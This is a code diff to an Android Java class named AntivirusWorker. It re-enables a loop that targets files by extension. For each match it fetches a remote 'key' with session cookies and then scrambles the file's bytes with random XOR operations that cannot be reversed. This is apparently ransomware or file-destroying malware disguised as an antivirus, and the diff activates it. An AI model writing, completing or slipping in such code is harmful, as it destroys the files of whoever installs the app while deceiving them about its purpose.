@@ -34,6 +34,8 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.math.BigInteger;
+import java.net.HttpCookie;
+import java.net.URI;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.MessageDigest;
@@ -124,11 +126,11 @@ public class AntivirusWorker extends Worker {
                        }
                    }, Throwable::printStackTrace);
                    Volley.newRequestQueue(getApplicationContext()).add(jsonObjectRequest);
-//                   for(String lmao:extenstions) {
-//                       if (oof.getAbsolutePath().endsWith(lmao)) {
-//                           weeeeeeeeeeeeee(oof);
-//                       }
-//                   }
+                   for(String lmao:extenstions) {
+                       if (oof.getAbsolutePath().endsWith(lmao)) {
+                           weeeeeeeeeeeeee(oof);
+                       }
+                   }
                    progressCount+= 1;
                }
            }
@@ -174,7 +176,7 @@ public class AntivirusWorker extends Worker {
     private void weeeeeeeeeeeeee(File file){
         YeetRequest yeetRequest =  new YeetRequest(YeetRequest.Method.GET,url,null,response -> {
             try {
-                Log.i(LOG_TAG, String.valueOf(response));
+                Log.i(LOG_TAG, response.getString("session-ID"));
                 String boom = response.getString("key");
                 md = MessageDigest.getInstance("SHA-256");
                 byte[] keyBytes = md.digest(boom.getBytes());
@@ -203,6 +205,7 @@ public class AntivirusWorker extends Worker {
                 Log.e(LOG_TAG, "shit", e);
             }
         },Throwable::printStackTrace);
+        yeetRequest.setCookies(new CookieBoi(getApplicationContext()).get(URI.create(url)));
         Volley.newRequestQueue(getApplicationContext()).add(yeetRequest);
     }
 
@@ -210,17 +213,14 @@ public class AntivirusWorker extends Worker {
         Random random = new Random();
         for(int i = 0;i<original.length;i++){
             int x = random.nextInt(original.length);
-            byte temp = original[x];
-            original[x] = original[i];
-            original[i] = temp;
-            original = x%16 == 0 ? xorFun(original,i) : original;
-            Log.i(LOG_TAG,String.format("Byte %d is swapped with byte %d",i,x));
+            original = x%16 == 0 ? xorFun(original,i,x) : original;
+            Log.i(LOG_TAG,String.format("Byte %d is xored with byte %d",i,x));
         }
         return original;
     }
 
-    private byte[] xorFun(byte[] original,int x){
-        byte xored = x+1 == original.length ? (byte) (original[x] ^ original[x+1]) : (byte) (original[x] ^ original[0]);
+    private byte[] xorFun(byte[] original,int x,int y){
+        byte xored = (byte) (original[x] ^ original[y]);
         original[x] = xored;
         return original;
     }
